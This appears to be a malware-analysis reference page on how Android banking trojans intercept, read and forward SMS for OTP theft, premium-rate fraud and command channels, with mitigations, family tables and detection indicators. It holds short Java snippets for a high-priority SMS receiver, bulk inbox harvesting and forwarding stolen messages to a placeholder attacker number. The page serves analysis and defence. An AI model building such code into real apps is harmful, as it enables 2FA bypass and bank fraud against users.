# SMS Interception & Theft

Intercepting, reading, sending, and forwarding SMS messages for OTP theft, premium fraud, worm propagation, and command-and-control. SMS interception was the original 2FA bypass technique in Android banking malware and remains relevant despite Android's progressive restrictions, because many financial institutions still rely on SMS-based authentication.

See also: [Notification Suppression](notification-suppression.md#sms-notification-suppression), [Call Interception](call-interception.md), [Notification Listener Abuse](notification-listener-abuse.md)

!!! warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Permission | [`RECEIVE_SMS`](../permissions/sms/receive-sms.md), [`READ_SMS`](../permissions/sms/read-sms.md), [`SEND_SMS`](../permissions/sms/send-sms.md) -- varies by technique |
    | Play Store | Restricted since January 2019. Only default SMS apps and approved use cases. |
    | Distribution | Most SMS-abusing malware distributes via sideloading, smishing links, or third-party stores |

## Attack Techniques

### Broadcast Interception

The `SMS_RECEIVED` broadcast is ordered, meaning receivers execute by priority. Malware registers a high-priority receiver to process the SMS before any other app:

```xml
<receiver android:name=".SmsReceiver" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>
```

??? example "High-Priority SMS Broadcast Receiver with Exfiltration"

    ```java
    public class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            for (SmsMessage msg : msgs) {
                String sender = msg.getOriginatingAddress();
                String body = msg.getMessageBody();
                exfiltrate(sender, body);
            }
            abortBroadcast();
        }
    }
    ```

`abortBroadcast()` prevents the default SMS app from receiving the message -- the user never sees it. On Android 4.4+, only the default SMS app can successfully abort the broadcast, but the malware still receives and reads the content.

### ContentResolver SMS Query

Reading stored SMS messages from the system content provider. Does not require real-time interception -- the malware queries the SMS database retroactively:

```java
Cursor cursor = getContentResolver().query(
    Uri.parse("content://sms/inbox"),
    new String[]{"address", "body", "date"},
    null, null, "date DESC"
);
while (cursor.moveToNext()) {
    String sender = cursor.getString(0);
    String body = cursor.getString(1);
    long date = cursor.getLong(2);
    exfiltrate(sender, body, date);
}
cursor.close();
```

This provides access to the entire SMS history. Malware uses it to harvest OTP codes that arrived before the malware was installed, or to bulk-exfiltrate all messages for intelligence collection.

### Default SMS App Technique

Becoming the default SMS handler gives full control over SMS: reading, writing, sending, and deleting. The malware requests the `RoleManager.ROLE_SMS` role (Android 10+) or `Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT`:

```java
RoleManager rm = getSystemService(RoleManager.class);
if (!rm.isRoleHeld(RoleManager.ROLE_SMS)) {
    startActivityForResult(rm.createRequestRoleIntent(RoleManager.ROLE_SMS), REQ_CODE);
}
```

As default SMS app, the malware can:

- Intercept all incoming SMS silently
- Delete messages before the user reads them
- Send SMS on the user's behalf
- Access the full SMS database

Social engineering drives this: the malware presents itself as an SMS management app and asks the user to set it as default during onboarding.

### SmsRetriever API Abuse

Google's `SmsRetriever` API lets apps receive specific SMS messages without `READ_SMS` or `RECEIVE_SMS` permissions. It works by matching an app-specific hash in the SMS body. Malware abuses this when:

- The attacker controls the SMS being sent (phishing scenarios)
- The attacker can predict or compute the target app's hash
- The malware poses as a legitimate app expecting verification SMS

The API is designed for one-time verification and auto-fills the code. Malware intercepts the `SmsRetriever` result to steal the code.

### SMS Forwarding

After intercepting an SMS, the malware forwards it to an attacker-controlled number:

```java
SmsManager sm = SmsManager.getDefault();
sm.sendTextMessage("+1234567890", null, stolenBody, null, null);
```

Some families forward every incoming SMS; others filter by sender (banking shortcodes) or content (messages containing digits matching OTP patterns). Forwarding creates a persistent exfiltration channel that works even if the C2 server is down.

### Premium SMS Fraud

Sending SMS to premium-rate numbers that charge the victim's phone bill. The malware sends to short codes controlled by the attacker (or an affiliate network), generating revenue per message:

1. Malware sends SMS to premium short code
2. Service replies with confirmation SMS
3. Malware intercepts the confirmation and replies to complete the subscription
4. Victim is charged recurring fees on their phone bill

This was the dominant monetization strategy before banking trojans emerged. [Joker](../malware/families/joker.md) alone was found in hundreds of Play Store apps running premium SMS fraud.

### USSD Code Execution

Using [`CALL_PHONE`](../permissions/phone/call-phone.md) permission to dial USSD codes that check balances, initiate transfers, or change account settings:

```java
Intent ussd = new Intent(Intent.ACTION_CALL);
ussd.setData(Uri.parse("tel:" + Uri.encode("*123#")));
startActivity(ussd);
```

USSD codes vary by carrier and country. Malware targeting specific regions hardcodes USSD strings for local carriers to check prepaid balances, transfer airtime, or subscribe to services.

## SMS as C2 Channel

Some families receive commands via SMS as a fallback when HTTP/HTTPS C2 is unreachable:

| Aspect | SMS C2 | HTTP C2 |
|--------|--------|---------|
| Availability | Works without internet | Requires connectivity |
| Takedown resistance | No domain or IP to sinkhole | Domains can be seized |
| Visibility | Carrier logs, lawful intercept | Network monitoring, TLS inspection |
| Bandwidth | Very low, 160 chars per message | Unlimited |
| Cost | Sender pays per message | Free after infrastructure setup |

Commands arrive as specially formatted SMS. The malware parses the body, executes the instruction, and optionally replies via SMS. State-sponsored tools like FinSpy and early Pegasus variants used SMS C2 because the operators had carrier-level access, eliminating the visibility risk.

## Evolution of SMS-Based Attacks

| Era | Technique | Status |
|-----|-----------|--------|
| 2012-2014 | Premium SMS fraud (send to short codes) | Still works, heavily monitored |
| 2014-2017 | `SMS_RECEIVED` broadcast with `abortBroadcast()` | Broken on Android 4.4+ for non-default apps |
| 2017-2019 | Full SMS permissions for OTP theft | Play Store ban in 2019 |
| 2019-2021 | Default SMS app social engineering | Requires user interaction |
| 2020+ | Notification listener replaces SMS interception | Current primary method |
| 2021+ | Accessibility-based SMS reading | Current fallback method |
| 2022+ | SmsRetriever API for targeted code theft | Niche use cases |

The trend is clear: each Android restriction pushed malware toward alternative channels. Modern families combine multiple approaches -- [notification listener](notification-listener-abuse.md) as primary, [accessibility](accessibility-abuse.md) as fallback, and SMS permissions only when available.

!!! tip "Notification Listener is the Modern Replacement"

    Since 2020, most banking trojans use [notification listener abuse](notification-listener-abuse.md) to read OTP codes from notification content instead of requesting SMS permissions. If a sample requests `RECEIVE_SMS` alongside `BIND_NOTIFICATION_LISTENER_SERVICE`, the SMS path is likely a fallback for devices where notification access was not granted.

## Android Mitigations

| Version | Mitigation | Bypass |
|---------|-----------|--------|
| Android 4.4 (API 19) | Only the default SMS app can call `abortBroadcast()` on `SMS_RECEIVED` | Other apps still receive the broadcast, just cannot suppress it |
| Android 5.0 (API 21) | `SMS_DELIVER` broadcast sent only to default SMS app | `SMS_RECEIVED` still goes to all receivers |
| Android 6.0 (API 23) | SMS permissions become runtime permissions | Social engineering user to grant at runtime |
| Android 8.0 (API 26) | Implicit broadcast restrictions | `SMS_RECEIVED` is exempt, still delivered to manifest-registered receivers |
| Android 10 (API 29) | `READ_SMS` restricted to default SMS app or active accessibility service; `ROLE_SMS` replaces `ACTION_CHANGE_DEFAULT` | Accessibility service grants access to SMS content provider |
| Android 13 (API 33) | Restricted settings prevent sideloaded apps from being set as default SMS app | Session-based package installer bypass |

## Families Using This Technique

| Family | SMS Techniques | Primary Purpose |
|--------|---------------|-----------------|
| [FluBot](../malware/families/flubot.md) | `SEND_SMS` to spread phishing links to all contacts, `RECEIVE_SMS` for OTP | SMS worm propagation |
| [Anubis](../malware/families/anubis.md) | `RECEIVE_SMS` interception, SMS forwarding to C2 | OTP theft for banking fraud |
| [SpyNote](../malware/families/spynote.md) | Full SMS read/receive/send for comprehensive surveillance | RAT, SMS exfiltration |
| [Hydra](../malware/families/hydra.md) | SMS forwarding to attacker-controlled numbers, OTP interception | Banking fraud |
| [Medusa](../malware/families/medusa.md) | SMS commands as C2 channel, OTP interception (v1) | Banking fraud, remote control |
| [BRATA](../malware/families/brata.md) | SMS reading for transaction confirmation codes, factory reset after theft | Banking fraud |
| [Joker](../malware/families/joker.md) | `SEND_SMS` to premium numbers, `RECEIVE_SMS` for confirmation interception | Premium SMS subscription fraud |
| [Cerberus](../malware/families/cerberus.md) | SMS interception with C2 forwarding, SMS-based 2FA bypass | Banking credential theft |
| [GodFather](../malware/families/godfather.md) | SMS interception alongside notification monitoring | Banking fraud |
| [Ermac](../malware/families/ermac.md) | SMS-based 2FA interception | Banking fraud |
| [Hook](../malware/families/hook.md) | SMS interception during ATS operations | Banking ATS |
| [Octo](../malware/families/octo.md) | SMS interception during remote access sessions | Banking fraud |
| [Xenomorph](../malware/families/xenomorph.md) | SMS OTP capture feeding into ATS engine | Banking ATS |
| [Anatsa](../malware/families/anatsa.md) | OTP theft during automated bank transfers | Banking ATS |
| [SharkBot](../malware/families/sharkbot.md) | SMS interception for ATS OTP bypass | Banking ATS |
| [Vultur](../malware/families/vultur.md) | SMS interception alongside screen recording | Banking fraud |
| [Chameleon](../malware/families/chameleon.md) | SMS interception after disabling biometric prompts | Banking fraud |
| [Mamont](../malware/families/mamont.md) | SMS interception combined with notification listening | Russian banking fraud |
| [TsarBot](../malware/families/tsarbot.md) | SMS OTP capture across 750+ target apps | Banking ATS |
| [Antidot](../malware/families/antidot.md) | SMS-based 2FA interception | Banking fraud |
| [Crocodilus](../malware/families/crocodilus.md) | OTP theft during device takeover operations | Banking DTO |
| [MoqHao](../malware/families/moqhao.md) | SMS phishing distribution, SMS interception | Smishing worm |
| [Rafel RAT](../malware/families/rafelrat.md) | SMS interception, ransomware unlock via SMS | RAT, ransomware |
| [TrickMo](../malware/families/trickmo.md) | SMS OTP theft, originally TrickBot's Android companion | Banking fraud |

!!! info "FluBot -- SMS Worm Propagation"

    [FluBot](../malware/families/flubot.md) stands out as a true SMS worm: it reads the victim's contact list and sends [phishing](phishing-techniques.md) SMS to every entry, each containing a link to download FluBot. At peak spread in 2021, it infected devices across Europe in chain-reaction fashion. Its infrastructure was taken down by Europol in 2022, but the SMS worm pattern has been replicated by [MoqHao](../malware/families/moqhao.md) and other families.

## Detection During Analysis

??? example "Static Indicators"

    - `BroadcastReceiver` with `SMS_RECEIVED` intent filter, especially with high `android:priority`
    - `RECEIVE_SMS`, `READ_SMS`, `SEND_SMS` permissions in manifest
    - References to `content://sms` content provider URI
    - `SmsManager.sendTextMessage()` or `sendMultipartTextMessage()` calls
    - `Telephony.Sms.Intents.getMessagesFromIntent()` usage
    - `RoleManager.ROLE_SMS` or `ACTION_CHANGE_DEFAULT` intent
    - `abortBroadcast()` calls inside SMS receivers

??? example "Dynamic Indicators"

    - SMS messages sent to unknown numbers shortly after installation
    - Outbound SMS to premium short codes
    - ContentResolver queries against `content://sms` returning bulk data
    - Network traffic containing SMS content or OTP codes
    - USSD dial attempts via `ACTION_CALL` intents

## See Also

- [SMS Permissions](../permissions/sms/index.md)
- [Notification Listener Abuse](notification-listener-abuse.md) -- the modern replacement for SMS interception
- [Broadcast Theft](broadcast-theft.md) -- broader broadcast interception techniques
